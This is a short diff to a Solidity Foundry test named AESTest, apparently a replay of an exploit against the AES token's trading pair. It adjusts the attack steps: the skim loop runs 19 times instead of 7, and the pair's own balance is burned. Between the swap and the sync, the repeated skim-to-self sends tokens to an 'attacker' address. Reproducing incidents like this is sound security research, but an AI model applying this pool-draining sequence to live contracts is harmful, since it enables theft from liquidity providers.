@@ -184,7 +184,7 @@ contract AESTest is Test, BlockLoader {
 
     function burn_pair_aes(uint256 amount) internal {
         aes.transfer(address(pair), amount);
-        for (uint256 i = 0; i < 7; i++) {
+        for (uint256 i = 0; i < 19; i++) {
             pair.skim(address(pair));
         }
         pair.skim(attacker);
@@ -197,7 +197,7 @@ contract AESTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_usdt_aes(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        burn_pair_aes(aes.balanceOf(attacker) / 2);
+        burn_pair_aes(aes.balanceOf(pairAddr));
         printBalance("After step2 ");
         sync_pair();
         printBalance("After step3 ");
